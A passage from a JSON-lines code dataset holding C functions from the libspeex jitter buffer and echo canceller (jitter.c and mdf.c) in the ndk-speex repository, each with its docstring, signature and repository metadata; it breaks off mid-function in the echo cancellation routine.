((spx_int32_t)packet->timestamp) - ((spx_int32_t)jitter->next_stop) - jitter->buffer_margin);\n      late = 1;\n   } else {\n      late = 0;\n   }\n\n   /* For some reason, the consumer has failed the last 20 fetches. Make sure this packet is\n    * used to resync. */\n   if (jitter->lost_count>20)\n   {\n      jitter_buffer_reset(jitter);\n   }\n   \n   /* Only insert the packet if it's not hopelessly late (i.e. totally useless) */\n   if (jitter->reset_state || GE32(packet->timestamp+packet->span+jitter->delay_step, jitter->pointer_timestamp))\n   {\n\n      /*Find an empty slot in the buffer*/\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         if (jitter->packets[i].data==NULL)\n            break;\n      }\n      \n      /*No place left in the buffer, need to make room for it by discarding the oldest packet */\n      if (i==SPEEX_JITTER_MAX_BUFFER_SIZE)\n      {\n         int earliest=jitter->packets[0].timestamp;\n         i=0;\n         for (j=1;j<SPEEX_JITTER_MAX_BUFFER_SIZE;j++)\n         {\n            if (!jitter->packets[i].data || LT32(jitter->packets[j].timestamp,earliest))\n            {\n               earliest = jitter->packets[j].timestamp;\n               i=j;\n            }\n         }\n         if (jitter->destroy)\n            jitter->destroy(jitter->packets[i].data);\n         else\n            speex_free(jitter->packets[i].data);\n         jitter->packets[i].data=NULL;\n         /*fprintf (stderr, \"Buffer is full, discarding earliest frame %d (currently at %d)\\n\", timestamp, jitter->pointer_timestamp);*/      \n      }\n   \n      /* Copy packet in buffer */\n      if (jitter->destroy)\n      {\n         jitter->packets[i].data = packet->data;\n      } else {\n         jitter->packets[i].data=(char*)speex_alloc(packet->len);\n         for (j=0;j<packet->len;j++)\n            jitter->packets[i].data[j]=packet->data[j];\n      }\n      jitter->packets[i].timestamp=packet->timestamp;\n      jitter->packets[i].span=packet->span;\n      jitter->packets[i].len=packet->len;\n      jitter->packets[i].sequence=packet->sequence;\n      jitter->packets[i].user_data=packet->user_data;\n      if (jitter->reset_state || late)\n         jitter->arrival[i] = 0;\n      else\n         jitter->arrival[i] = jitter->next_stop;\n   }\n   \n   \n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Resets echo canceller state */\n", "func_signal": "EXPORT void speex_echo_state_reset(SpeexEchoState *st)", "code": "{\n   int i, M, N, C, K;\n   st->cancel_count=0;\n   st->screwed_up = 0;\n   N = st->window_size;\n   M = st->M;\n   C=st->C;\n   K=st->K;\n   for (i=0;i<N*M;i++)\n      st->W[i] = 0;\n#ifdef TWO_PATH\n   for (i=0;i<N*M;i++)\n      st->foreground[i] = 0;\n#endif\n   for (i=0;i<N*(M+1);i++)\n      st->X[i] = 0;\n   for (i=0;i<=st->frame_size;i++)\n   {\n      st->power[i] = 0;\n      st->power_1[i] = FLOAT_ONE;\n      st->Eh[i] = 0;\n      st->Yh[i] = 0;\n   }\n   for (i=0;i<st->frame_size;i++)\n   {\n      st->last_y[i] = 0;\n   }\n   for (i=0;i<N*C;i++)\n   {\n      st->E[i] = 0;\n   }\n   for (i=0;i<N*K;i++)\n   {\n      st->x[i] = 0;\n   }\n   for (i=0;i<2*C;i++)\n      st->notch_mem[i] = 0;\n   for (i=0;i<C;i++)\n      st->memD[i]=st->memE[i]=0;\n   for (i=0;i<K;i++)\n      st->memX[i]=0;\n\n   st->saturated = 0;\n   st->adapted = 0;\n   st->sum_adapt = 0;\n   st->Pey = st->Pyy = FLOAT_ONE;\n#ifdef TWO_PATH\n   st->Davg1 = st->Davg2 = 0;\n   st->Dvar1 = st->Dvar2 = FLOAT_ZERO;\n#endif\n   for (i=0;i<3*st->frame_size;i++)\n      st->play_buf[i] = 0;\n   st->play_buf_pos = PLAYBACK_DELAY*st->frame_size;\n   st->play_buf_started = 0;\n\n}", "path": "speexjni\\jni\\libspeex\\mdf.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/* Let the jitter buffer know it's the right time to adjust the buffering delay to the network conditions */\n", "func_signal": "EXPORT int jitter_buffer_update_delay(JitterBuffer *jitter, JitterBufferPacket *packet, spx_int32_t *start_offset)", "code": "{\n   /* If the programmer calls jitter_buffer_update_delay() directly, \n      automatically disable auto-adjustment */\n   jitter->auto_adjust = 0;\n\n   return _jitter_buffer_update_delay(jitter, packet, start_offset);\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/* This inner product is slightly different from the codec version because of fixed-point */\n", "func_signal": "static inline spx_word32_t mdf_inner_prod(const spx_word16_t *x, const spx_word16_t *y, int len)", "code": "{\n   spx_word32_t sum=0;\n   len >>= 1;\n   while(len--)\n   {\n      spx_word32_t part=0;\n      part = MAC16_16(part,*x++,*y++);\n      part = MAC16_16(part,*x++,*y++);\n      /* HINT: If you had a 40-bit accumulator, you could shift only at the end */\n      sum = ADD32(sum,SHR32(part,6));\n   }\n   return sum;\n}", "path": "speexjni\\jni\\libspeex\\mdf.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Initialise jitter buffer */\n", "func_signal": "EXPORT JitterBuffer *jitter_buffer_init(int step_size)", "code": "{\n   JitterBuffer *jitter = (JitterBuffer*)speex_alloc(sizeof(JitterBuffer));\n   if (jitter)\n   {\n      int i;\n      spx_int32_t tmp;\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n         jitter->packets[i].data=NULL;\n      jitter->delay_step = step_size;\n      jitter->concealment_size = step_size;\n      /*FIXME: Should this be 0 or 1?*/\n      jitter->buffer_margin = 0;\n      jitter->late_cutoff = 50;\n      jitter->destroy = NULL;\n      jitter->latency_tradeoff = 0;\n      jitter->auto_adjust = 1;\n      tmp = 4;\n      jitter_buffer_ctl(jitter, JITTER_BUFFER_SET_MAX_LATE_RATE, &tmp);\n      jitter_buffer_reset(jitter);\n   }\n   return jitter;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Compute power spectrum of a half-complex (packed) vector and accumulate */\n", "func_signal": "static inline void power_spectrum_accum(const spx_word16_t *X, spx_word32_t *ps, int N)", "code": "{\n   int i, j;\n   ps[0]+=MULT16_16(X[0],X[0]);\n   for (i=1,j=1;i<N-1;i+=2,j++)\n   {\n      ps[j] +=  MULT16_16(X[i],X[i]) + MULT16_16(X[i+1],X[i+1]);\n   }\n   ps[j]+=MULT16_16(X[i],X[i]);\n}", "path": "speexjni\\jni\\libspeex\\mdf.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Destroy jitter buffer */\n", "func_signal": "EXPORT void jitter_buffer_destroy(JitterBuffer *jitter)", "code": "{\n   jitter_buffer_reset(jitter);\n   speex_free(jitter);\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Destroys an echo canceller state */\n", "func_signal": "EXPORT void speex_echo_state_destroy(SpeexEchoState *st)", "code": "{\n   spx_fft_destroy(st->fft_table);\n\n   speex_free(st->e);\n   speex_free(st->x);\n   speex_free(st->input);\n   speex_free(st->y);\n   speex_free(st->last_y);\n   speex_free(st->Yf);\n   speex_free(st->Rf);\n   speex_free(st->Xf);\n   speex_free(st->Yh);\n   speex_free(st->Eh);\n\n   speex_free(st->X);\n   speex_free(st->Y);\n   speex_free(st->E);\n   speex_free(st->W);\n#ifdef TWO_PATH\n   speex_free(st->foreground);\n#endif\n   speex_free(st->PHI);\n   speex_free(st->power);\n   speex_free(st->power_1);\n   speex_free(st->window);\n   speex_free(st->prop);\n   speex_free(st->wtmp);\n#ifdef FIXED_POINT\n   speex_free(st->wtmp2);\n#endif\n   speex_free(st->memX);\n   speex_free(st->memD);\n   speex_free(st->memE);\n   speex_free(st->notch_mem);\n\n   speex_free(st->play_buf);\n   speex_free(st);\n   \n#ifdef DUMP_ECHO_CANCEL_DATA\n   fclose(rFile);\n   fclose(pFile);\n   fclose(oFile);\n   rFile = pFile = oFile = NULL;\n#endif\n}", "path": "speexjni\\jni\\libspeex\\mdf.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Based on available data, this computes the optimal delay for the jitter buffer. \n   The optimised function is in timestamp units and is:\n   cost = delay + late_factor*[number of frames that would be late if we used that delay]\n   @param tb Array of buffers\n   @param late_factor Equivalent cost of a late frame (in timestamp units) \n */\n", "func_signal": "static spx_int16_t compute_opt_delay(JitterBuffer *jitter)", "code": "{\n   int i;\n   spx_int16_t opt=0;\n   spx_int32_t best_cost=0x7fffffff;\n   int late = 0;\n   int pos[MAX_BUFFERS];\n   int tot_count;\n   float late_factor;\n   int penalty_taken = 0;\n   int best = 0;\n   int worst = 0;\n   spx_int32_t deltaT;\n   struct TimingBuffer *tb;\n   \n   tb = jitter->_tb;\n   \n   /* Number of packet timings we have received (including those we didn't keep) */\n   tot_count = 0;\n   for (i=0;i<MAX_BUFFERS;i++)\n      tot_count += tb[i].curr_count;\n   if (tot_count==0)\n      return 0;\n   \n   /* Compute cost for one lost packet */\n   if (jitter->latency_tradeoff != 0)\n      late_factor = jitter->latency_tradeoff * 100.0f / tot_count;\n   else\n      late_factor = jitter->auto_tradeoff * jitter->window_size/tot_count;\n   \n   /*fprintf(stderr, \"late_factor = %f\\n\", late_factor);*/\n   for (i=0;i<MAX_BUFFERS;i++)\n      pos[i] = 0;\n   \n   /* Pick the TOP_DELAY \"latest\" packets (doesn't need to actually be late \n      for the current settings) */\n   for (i=0;i<TOP_DELAY;i++)\n   {\n      int j;\n      int next=-1;\n      int latest = 32767;\n      /* Pick latest amoung all sub-windows */\n      for (j=0;j<MAX_BUFFERS;j++)\n      {\n         if (pos[j] < tb[j].filled && tb[j].timing[pos[j]] < latest)\n         {\n            next = j;\n            latest = tb[j].timing[pos[j]];\n         }\n      }\n      if (next != -1)\n      {\n         spx_int32_t cost;\n         \n         if (i==0)\n            worst = latest;\n         best = latest;\n         latest = ROUND_DOWN(latest, jitter->delay_step);\n         pos[next]++;\n         \n         /* Actual cost function that tells us how bad using this delay would be */\n         cost = -latest + late_factor*late;\n         /*fprintf(stderr, \"cost %d = %d + %f * %d\\n\", cost, -latest, late_factor, late);*/\n         if (cost < best_cost)\n         {\n            best_cost = cost;\n            opt = latest;\n         }\n      } else {\n         break;\n      }\n      \n      /* For the next timing we will consider, there will be one more late packet to count */\n      late++;\n      /* Two-frame penalty if we're going to increase the amount of late frames (hysteresis) */\n      if (latest >= 0 && !penalty_taken)\n      {\n         penalty_taken = 1;\n         late+=4;\n      }\n   }\n   \n   deltaT = best-worst;\n   /* This is a default \"automatic latency tradeoff\" when none is provided */\n   jitter->auto_tradeoff = 1 + deltaT/TOP_DELAY;\n   /*fprintf(stderr, \"auto_tradeoff = %d (%d %d %d)\\n\", jitter->auto_tradeoff, best, worst, i);*/\n   \n   /* FIXME: Compute a short-term estimate too and combine with the long-term one */\n   \n   /* Prevents reducing the buffer size when we haven't really had much data */\n   if (tot_count < TOP_DELAY && opt > 0)\n      return 0;\n   return opt;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/* Add the timing of a new packet to the TimingBuffer */\n", "func_signal": "static void tb_add(struct TimingBuffer *tb, spx_int16_t timing)", "code": "{\n   int pos;\n   /* Discard packet that won't make it into the list because they're too early */\n   if (tb->filled >= MAX_TIMINGS && timing >= tb->timing[tb->filled-1])\n   {\n      tb->curr_count++;\n      return;\n   }\n   \n   /* Find where the timing info goes in the sorted list */\n   pos = 0;\n   /* FIXME: Do bisection instead of linear search */\n   while (pos<tb->filled && timing >= tb->timing[pos])\n   {\n      pos++;\n   }\n   \n   speex_assert(pos <= tb->filled && pos < MAX_TIMINGS);\n   \n   /* Shift everything so we can perform the insertion */\n   if (pos < tb->filled)\n   {\n      int move_size = tb->filled-pos;\n      if (tb->filled == MAX_TIMINGS)\n         move_size -= 1;\n      SPEEX_MOVE(&tb->timing[pos+1], &tb->timing[pos], move_size);\n      SPEEX_MOVE(&tb->counts[pos+1], &tb->counts[pos], move_size);\n   }\n   /* Insert */\n   tb->timing[pos] = timing;\n   tb->counts[pos] = tb->curr_count;\n   \n   tb->curr_count++;\n   if (tb->filled<MAX_TIMINGS)\n      tb->filled++;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Compensate all timings when we do an adjustment of the buffering */\n", "func_signal": "static void shift_timings(JitterBuffer *jitter, spx_int16_t amount)", "code": "{\n   int i, j;\n   for (i=0;i<MAX_BUFFERS;i++)\n   {\n      for (j=0;j<jitter->timeBuffers[i]->filled;j++)\n         jitter->timeBuffers[i]->timing[j] += amount;\n   }\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/* Let the jitter buffer know it's the right time to adjust the buffering delay to the network conditions */\n", "func_signal": "static int _jitter_buffer_update_delay(JitterBuffer *jitter, JitterBufferPacket *packet, spx_int32_t *start_offset)", "code": "{\n   spx_int16_t opt = compute_opt_delay(jitter);\n   /*fprintf(stderr, \"opt adjustment is %d \", opt);*/\n   \n   if (opt < 0)\n   {\n      shift_timings(jitter, -opt);\n      \n      jitter->pointer_timestamp += opt;\n      jitter->interp_requested = -opt;\n      /*fprintf (stderr, \"Decision to interpolate %d samples\\n\", -opt);*/\n   } else if (opt > 0)\n   {\n      shift_timings(jitter, -opt);\n      jitter->pointer_timestamp += opt;\n      /*fprintf (stderr, \"Decision to drop %d samples\\n\", opt);*/\n   }\n   \n   return opt;\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Compute power spectrum of a half-complex (packed) vector */\n", "func_signal": "static inline void power_spectrum(const spx_word16_t *X, spx_word32_t *ps, int N)", "code": "{\n   int i, j;\n   ps[0]=MULT16_16(X[0],X[0]);\n   for (i=1,j=1;i<N-1;i+=2,j++)\n   {\n      ps[j] =  MULT16_16(X[i],X[i]) + MULT16_16(X[i+1],X[i+1]);\n   }\n   ps[j]=MULT16_16(X[i],X[i]);\n}", "path": "speexjni\\jni\\libspeex\\mdf.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/* Compute spectrum of estimated echo for use in an echo post-filter */\n", "func_signal": "void speex_echo_get_residual(SpeexEchoState *st, spx_word32_t *residual_echo, int len)", "code": "{\n   int i;\n   spx_word16_t leak2;\n   int N;\n   \n   N = st->window_size;\n\n   /* Apply hanning window (should pre-compute it)*/\n   for (i=0;i<N;i++)\n      st->y[i] = MULT16_16_Q15(st->window[i],st->last_y[i]);\n      \n   /* Compute power spectrum of the echo */\n   spx_fft(st->fft_table, st->y, st->Y);\n   power_spectrum(st->Y, residual_echo, N);\n      \n#ifdef FIXED_POINT\n   if (st->leak_estimate > 16383)\n      leak2 = 32767;\n   else\n      leak2 = SHL16(st->leak_estimate, 1);\n#else\n   if (st->leak_estimate>.5)\n      leak2 = 1;\n   else\n      leak2 = 2*st->leak_estimate;\n#endif\n   /* Estimate residual echo */\n   for (i=0;i<=st->frame_size;i++)\n      residual_echo[i] = (spx_int32_t)MULT16_32_Q15(leak2,residual_echo[i]);\n   \n}", "path": "speexjni\\jni\\libspeex\\mdf.c", "repo_name": "mutantbob/ndk-speex", "stars": 44, "license": "None", "language": "c", "size": 407}
{"docstring": "/** Performs echo cancellation on a frame */\n", "func_signal": "EXPORT void speex_echo_cancellation(SpeexEchoState *st, const spx_int16_t *in, const spx_int16_t *far_end, spx_int16_t *out)", "code": "{\n   int i,j, chan, speak;\n   int N,M, C, K;\n   spx_word32_t Syy,See,Sxx,Sdd, Sff;\n#ifdef TWO_PATH\n   spx_word32_t Dbf;\n   int update_foreground;\n#endif\n   spx_word32_t Sey;\n   spx_word16_t ss, ss_1;\n   spx_float_t Pey = FLOAT_ONE, Pyy=FLOAT_ONE;\n   spx_float_t alpha, alpha_1;\n   spx_word16_t RER;\n   spx_word32_t tmp32;\n   \n   N = st->window_size;\n   M = st->M;\n   C = st->C;\n   K = st->K;\n\n   st->cancel_count++;\n#ifdef FIXED_POINT\n   ss=DIV32_16(11469,M);\n   ss_1 = SUB16(32767,ss);\n#else\n   ss=.35/M;\n   ss_1 = 1-ss;\n#endif\n\n   for (chan = 0; chan < C; chan++)\n   {\n      /* Apply a notch filter to make sure DC doesn't end up causing problems */\n      filter_dc_notch16(in+chan, st->notch_radius, st->input+chan*st->frame_size, st->frame_size, st->notch_mem+2*chan, C);\n      /* Copy input data to buffer and apply pre-emphasis */\n      /* Copy input data to buffer */\n      for (i=0;i<st->frame_size;i++)\n      {\n         spx_word32_t tmp32;\n         /* FIXME: This core has changed a bit, need to merge properly */\n         tmp32 = SUB32(EXTEND32(st->input[chan*st->frame_size+i]), EXTEND32(MULT16_16_P15(st->preemph, st->memD[chan])));\n#ifdef FIXED_POINT\n         if (tmp32 > 32767)\n         {\n            tmp32 = 32767;\n            if (st->saturated == 0)\n               st->saturated = 1;\n         }      \n         if (tmp32 < -32767)\n         {\n            tmp32 = -32767;\n            if (st->saturated == 0)\n               st->saturated = 1;\n         }\n#endif\n         st->memD[chan] = st->input[chan*st->frame_size+i];\n         st->input[chan*st->frame_size+i] = EXTRACT16(tmp32);\n      }\n   }\n\n   for (speak = 0; speak < K; speak++)\n   {\n      for (i=0;i<st->frame_size;i++)\n      {\n         spx_word32_t tmp32;\n         st->x[speak*N+i] = st->x[speak*N+i+st->frame_size];\n         tmp32 = SUB32(EXTEND32(far_end[i*K+speak]), EXTEND32(MULT16_16_P15(st->preemph, st->memX[speak])));\n#ifdef FIXED_POINT\n         /*FIXME: If saturation occurs here, we need to freeze adaptation for M frames (not just one) */\n         if (tmp32 > 32767)\n         {\n            tmp32 = 32767;\n            st->saturated = M+1;\n         }      \n         if (tmp32 < -32767)\n         {\n            tmp32 = -32767;\n            st->saturated = M+1;\n         }      \n#endif\n         st->x[speak*N+i+st->frame_size] = EXTRACT16(tmp32);\n         st->memX[speak] = far_end[i*K+speak];\n      }\n   }   \n   \n   for (speak = 0; speak < K; speak++)\n   {\n      /* Shift memory: this could be optimized eventually*/\n      for (j=M-1;j>=0;j--)\n      {\n         for (i=0;i<N;i++)\n            st->X[(j+1)*N*K+speak*N+i] = st->X[j*N*K+speak*N+i];\n      }\n      /* Convert x (echo input) to frequency domain */\n      spx_fft(st->fft_table, st->x+speak*N, &st->X[speak*N]);\n   }\n   \n   Sxx = 0;\n   for (speak = 0; speak < K; speak++)\n   {\n      Sxx += mdf_inner_prod(st->x+speak*N+st->frame_size, st->x+speak*N+st->frame_size, st->frame_size);\n      power_spectrum_accum(st->X+speak*N, st->Xf, N);\n   }\n   \n   Sff = 0;  \n   for (chan = 0; chan < C; chan++)\n   {\n#ifdef TWO_PATH\n      /* Compute foreground filter */\n      spectral_mul_accum16(st->X, st->foreground+chan*N*K*M, st->Y+chan*N, N, M*K);\n      spx_ifft(st->fft_table, st->Y+chan*N, st->e+chan*N);\n      for (i=0;i<st->frame_size;i++)\n         st->e[chan*N+i] = SUB16(st->input[chan*st->frame_size+i], st->e[chan*N+i+st->frame_size]);\n      Sff += mdf_inner_prod(st->e+chan*N, st->e+chan*N, st->frame_size);\n#endif\n   }\n   \n   /* Adjust proportional adaption rate */\n   /* FIXME: Adjust that for C, K*/\n   if (st->adapted)\n      mdf_adjust_prop (st->W, N, M, C*K, st->prop);\n   /* Compute weight gradient */\n   if (st->saturated == 0)\n   {\n      for (chan = 0; chan < C; chan++)\n      {\n         for (speak = 0; speak < K; speak++)\n         {\n            for (j=M-1;j>=0;j--)\n            {\n               weighted_spectral_mul_conj(st->power_1, FLOAT_SHL(PSEUDOFLOAT(st->prop[j]),-15), &st->X[(j+1)*N*K+speak*N], st->E+chan*N, st->PHI, N);\n               for (i=0;i<N;i++)\n                  st->W[chan*N*K*M + j*N*K + speak*N + i] += st->PHI[i];\n            }\n         }\n      }\n   } else {\n      st->saturated--;\n   }\n   \n   /* FIXME: MC conversion required */ \n   /* Update weight to prevent circular convolution (MDF / AUMDF) */\n   for (chan = 0; chan < C; chan++)\n   {\n      for (speak = 0; speak < K; speak++)\n      {\n         for (j=0;j<M;j++)\n         {\n            /* This is a variant of the Alternatively Updated MDF (AUMDF) */\n            /* Remove the \"if\" to make this an MDF filter */\n            if (j==0 || st->cancel_count%(M-1) == j-1)\n            {\n#ifdef FIXED_POINT\n               for (i=0;i<N;i++)\n                  st->wtmp2[i] = EXTRACT16(PSHR32(st->W[chan*N*K*M + j*N*K + speak*N + i],NORMALIZE_SCALEDOWN+16));\n               spx_ifft(st->fft_table, st->wtmp2, st->wtmp);\n               for (i=0;i<st->frame_size;i++)\n               {\n                  st->wtmp[i]=0;\n               }\n               for (i=st->frame_size;i<N;i++)\n               {\n                  st->wtmp[i]=SHL16(st->wtmp[i],NORMALIZE_SCALEUP);\n               }\n               spx_fft(st->fft_table, st->wtmp, st->wtmp2);\n               /* The \"-1\" in the shift is a sort of kludge that trades less efficient update speed for decrease noise */\n               for (i=0;i<N;i++)\n                  st->W[chan*N*K*M + j*N*K + speak*N + i] -= SHL32(EXTEND32(st->wtmp2[i]),16+NORMALIZE_SCALEDOWN-NORMALIZE_SCALEUP-1);\n#else\n               spx_ifft(st->fft_table, &st->W[chan*N*K*M + j*N*K + speak*N], st->wtmp);\n               for (i=st->frame_size;i<N;i++)\n               {\n                  st->wtmp[i]=0;\n               }\n               spx_fft(st->fft_table, st->wtmp, &st->W[chan*N*K*M + j*N*K + speak*N]);\n#endif\n            }\n         }\n      }\n   }\n   \n   /* So we can use power_spectrum_accum */ \n   for (i=0;i<=st->frame_size;i++)\n      st->Rf[i] = st->Yf[i] = st->Xf[i] = 0;\n      \n   Dbf = 0;\n   See = 0;    \n#ifdef TWO_PATH\n   /* Difference in response, this is used to estimate the variance of our residual power estimate */\n   for (chan = 0; chan < C; chan++)\n   {\n      spectral_mul_accum(st->X, st->W+chan*N*K*M, st->Y+chan*N, N, M*K);\n      spx_ifft(st->fft_table, st->Y+chan*N, st->y+chan*N);\n      for (i=0;i<st->frame_size;i++)\n         st->e[chan*N+i] = SUB16(st->e[chan*N+i+st->frame_size], st->y[chan*N+i+st->frame_size]);\n      Dbf += 10+mdf_inner_prod(st->e+chan*N, st->e+chan*N, st->frame_size);\n      for (i=0;i<st->frame_size;i++)\n         st->e[chan*N+i] = SUB16(st->input[chan*st->frame_size+i], st->y[chan*N+i+st->frame_size]);\n      See += mdf_inner_prod(st->e+chan*N, st->e+chan*N, st->frame_size);\n   }\n#endif\n\n#ifndef TWO_PATH\n   Sff = See;\n#endif\n\n#ifdef TWO_PATH\n   /* Logic for updating the foreground filter */\n   \n   /* For two time windows, compute the mean of the energy difference, as well as the variance */\n   st->Davg1 = ADD32(MULT16_32_Q15(QCONST16(.6f,15),st->Davg1), MULT16_32_Q15(QCONST16(.4f,15),SUB32(Sff,See)));\n   st->Davg2 = ADD32(MULT16_32_Q15(QCONST16(.85f,15),st->Davg2), MULT16_32_Q15(QCONST16(.15f,15),SUB32(Sff,See)));\n   st->Dvar1 = FLOAT_ADD(FLOAT_MULT(VAR1_SMOOTH, st->Dvar1), FLOAT_MUL32U(MULT16_32_Q15(QCONST16(.4f,15),Sff), MULT16_32_Q15(QCONST16(.4f,15),Dbf)));\n   st->Dvar2 = FLOAT_ADD(FLOAT_MULT(VAR2_SMOOTH, st->Dvar2), FLOAT_MUL32U(MULT16_32_Q15(QCONST16(.15f,15),Sff), MULT16_32_Q15(QCONST16(.15f,15),Dbf)));\n   \n   /* Equivalent float code:\n   st->Davg1 = .6*st->Davg1 + .4*(Sff-See);\n   st->Davg2 = .85*st->Davg2 + .15*(Sff-See);\n   st->Dvar1 = .36*st->Dvar1 + .16*Sff*Dbf;\n   st->Dvar2 = .7225*st->Dvar2 + .0225*Sff*Dbf;\n   */\n   \n   update_foreground = 0;\n   /* Check if we have a statistically significant reduction in the residual echo */\n   /* Note that this is *not* Gaussian, so we need to be careful about the longer tail */\n   if (FLOAT_GT(FLOAT_MUL32U(SUB32(Sff,See),ABS32(SUB32(Sff,See))), FLOAT_MUL32U(Sff,Dbf)))\n      update_foreground = 1;\n   else if (FLOAT_GT(FLOAT_MUL32U(st->Davg1, ABS32(st->Davg1)), FLOAT_MULT(VAR1_UPDATE,(st->Dvar1))))\n      update_foreground = 1;\n   else if (FLOAT_GT(FLOAT_MUL32U(st->Davg2, ABS32(st->Davg2)), FLOAT_MULT(VAR2_UPDATE,(st->Dvar2))))\n      update_foreground = 1;\n   \n   /* Do we update? */\n   if (update_foreground)\n   {\n      st->Davg1 = st->Davg2 = 0;\n      st->Dvar1 = st->Dvar2 = FLOAT_ZERO;\n      /* Copy background filter to foreground filter */\n      for (i=0;i<N*M*C*K;i++)\n         st->foreground[i] = EXTRACT16(PSHR32(st->W[i],16));\n      /* Apply a smooth transition so as to not introduce blocking artifacts */\n      for (chan = 0; chan < C; chan++)\n         for (i=0;i<st->frame_size;i++)\n            st->e[chan*N+i+st->frame_size] = MULT16_16_Q15(st->window[i+st->frame_size],st->e[chan*N+i+st->frame_size]) + MULT16_16_Q15(st->window[i],st->y[chan*N+i+st->frame_size]);\n   } else {\n      int reset_background=0;\n      /* Otherwise, check if the background filter is significantly worse */\n      if (FLOAT_GT(FLOAT_MUL32U(NEG32(SUB32(Sff,See)),ABS32(SUB32(Sff,See))), FLOAT_MULT(VAR_BACKTRACK,FLOAT_MUL32U(Sff,Dbf))))\n         reset_background = 1;\n      if (FLOAT_GT(FLOAT_MUL32U(NEG32(st->Davg1), ABS32(st->Davg1)), FLOAT_MULT(VAR_BACKTRACK,st->Dvar1)))\n         reset_background = 1;\n      if (FLOAT_GT(FLOAT_MUL32U(NEG32(st->Davg2), ABS32(st->Davg2)), FLOAT_MULT(VAR_BACKTRACK,st->Dvar2)))\n         reset_background = 1;\n      if (reset_background)\n      {\n         /* Copy foreground filter to background filter */\n         for (i=0;i<N*M*C*K;i++)\n            st->W[i] = SHL32(EXTEND32(st->foreground[i]),16);\n         /* We also need to copy the output so as to get correct adaptation */\n         for (chan = 0; chan < C; chan++)\n         {        \n            for (i=0;i<st->frame_size;i++)\n               st->y[chan*N+i+st->frame_size] = st->e[chan*N+i+st->frame_size];\n            for (i=0;i<st->frame_size;i++)\n               st->e[chan*N+i] = SUB16(st->input[chan*st->frame_size+i], st->y[chan*N+i+st->frame_size]);\n         }        \n         See = Sff;\n         st->Davg1 = st->Davg2 = 0;\n         st->Dvar1 = st->Dvar2 = FLOAT_ZERO;\n      }\n   }\n#endif\n\n   Sey = Syy = Sdd = 0;  \n   for (chan = 0; chan < C; chan++)\n   {    \n      /* Compute error signal (for the output with de-emphasis) */ \n      for (i=0;i<st->frame_size;i++)\n      {\n         spx_word32_t tmp_out;\n#ifdef TWO_PATH\n         tmp_out = SUB32(EXTEND32(st->input[chan*st->frame_size+i]), EXTEND32(st->e[chan*N+i+st->frame_size]));\n#else\n         tmp_out = SUB32(EXTEND32(st->input[chan*st->frame_size+i]), EXTEND32(st->y[chan*N+i+st->frame_size]));\n#endif\n         tmp_out = ADD32(tmp_out, EXTEND32(MULT16_16_P15(st->preemph, st->memE[chan])));\n      /* This is an arbitrary test for saturation in the microphone signal */\n         if (in[i*C+chan] <= -32000 || in[i*C+chan] >= 32000)\n         {\n         if (st->saturated == 0)\n            st->saturated = 1;\n         }\n         out[i*C+chan] = WORD2INT(tmp_out);\n         st->memE[chan] = tmp_out;\n      }\n\n#ifdef DUMP_ECHO_CANCEL_DATA\n      dump_audio(in, far_end, out, st->frame_size);\n#endif\n   \n      /* Compute error signal (filter update version) */ \n      for (i=0;i<st->frame_size;i++)\n      {\n         st->e[chan*N+i+st->frame_size] = st->e[chan*N+i];\n         st->e[chan*N+i] = 0;\n      }\n      \n      /* Compute a bunch of correlations */\n      /* FIXME: bad merge */\n      Sey += mdf_inner_prod(st->e+chan*N+st->frame_size, st->y+chan*N+st->frame_size, st->frame_size);\n      Syy += mdf_inner_prod(st->y+chan*N+st->frame_size, st->y+chan*N+st->frame_size, st->frame_size);\n      Sdd += mdf_inner_prod(st->input+chan*st->frame_size, st->input+chan*st->frame_size, st->frame_size);\n      \n      /* Convert error to frequency domain */\n      spx_fft(st->fft_table, st->e+chan*N, st->E+chan*N);\n      for (i=0;i<st->frame_size;i++)\n         st->y[i+chan*N] = 0;\n      spx_fft(st->fft_table, st->y+chan*N, st->Y+chan*N);\n   \n      /* Compute power spectrum of echo (X), error (E) and filter response (Y) */\n      power_spectrum_accum(st->E+chan*N, st->Rf, N);\n      power_spectrum_accum(st->Y+chan*N, st->Yf, N);\n    \n   }\n   \n   /*printf (\"%f %f %f %f\\n\", Sff, See, Syy, Sdd, st->update_cond);*/\n   \n   /* Do some sanity check */\n   if (!(Syy>=0 && Sxx>=0 && See >= 0)\n#ifndef FIXED_POINT\n       || !(Sff < N*1e9 && Syy < N*1e9 && Sxx < N*1e9)\n#endif\n      )\n   {\n      /* Things have gone really bad */\n      st->screwed_up += 50;\n      for (i=0;i<st->frame_size*C;i++)\n         out[i] = 0;\n   } else if (SHR32(Sff, 2) > ADD32(Sdd, 